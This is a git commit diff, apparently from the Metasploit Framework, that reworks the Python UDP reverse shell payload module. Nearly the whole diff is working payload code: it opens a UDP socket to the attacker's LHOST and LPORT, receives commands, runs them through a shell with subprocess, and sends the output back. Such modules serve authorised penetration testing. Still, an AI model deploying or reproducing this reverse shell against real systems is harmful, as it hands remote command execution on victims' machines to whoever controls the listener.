9613897294f2b9da7a47ad687cda4584e618a925
Tim W <timrlw@gmail.com>
2020-11-17 17:33:43 +0800

    fix python/shell_reverse_udp

--- modules/payloads/singles/python/shell_reverse_udp.rb
+++ modules/payloads/singles/python/shell_reverse_udp.rb
@@ -49,14 +49,14 @@ module MetasploitModule
       import socket as s
       import subprocess as r
       so=s.socket(s.AF_INET,s.SOCK_DGRAM)
-      so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
+      o=b''
       while True:
+      	so.sendto(o,('#{datastore['LHOST']}',#{datastore['LPORT']}))
       	d=so.recv(1024)
       	if len(d)==0:
       		break
       	p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
       	o=p.stdout.read()+p.stderr.read()
-      	so.send(o)
     PYTHON
 
     py_create_exec_stub(cmd)
